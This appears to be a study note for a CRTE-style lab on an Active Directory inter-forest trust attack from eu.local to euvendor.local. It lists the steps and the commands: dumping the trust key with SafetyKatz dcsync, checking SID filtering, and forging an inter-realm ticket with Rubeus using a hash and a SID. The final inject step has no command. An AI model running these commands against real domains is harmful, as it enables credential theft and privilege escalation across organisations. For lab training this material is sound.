# Methodology
>1. Dump the trust key of the child domain.
>2. Check if SID Filtering is enabled.
>3. Enumerate RID > 1000.
>4. Forge an inter-forest ticke.
>5. Inject the ticket. 


>**ℹ️ Info:**
>In this example we go from `eu.local` to `euvendor.local` .

---
# Powershell
>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](Notes/Certifications/CRTE/00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

## PowerView
**Check if SID Filtering is enabled:**
```powershell
Get-ADTrust -Filter *
```

**Look for groups with RID higher than 1000:**
```powershell
Get-ADGroup -Identity EUAdmins -Server euvendor.local
```

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](Notes/Certifications/CRTE/00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## SafetyKatz
**Dump trust key for the inter-forest trust:**
```cmd
SafetyKatz.exe '"lsadump::dcsync /user:eu\euvendor$"'
```

## Rubeus

**Forge an inter-realm TGT:**
```cmd
Rubeus.exe silver /user:Administrator /ldap /service:krbtgt/eu.local /rc4:b96659c7b2109d2e63e6de676d48646c /sid:S-1-5-21-3657428294-2017276338-1274645009 /nowrap 
```

**Inject the ticket**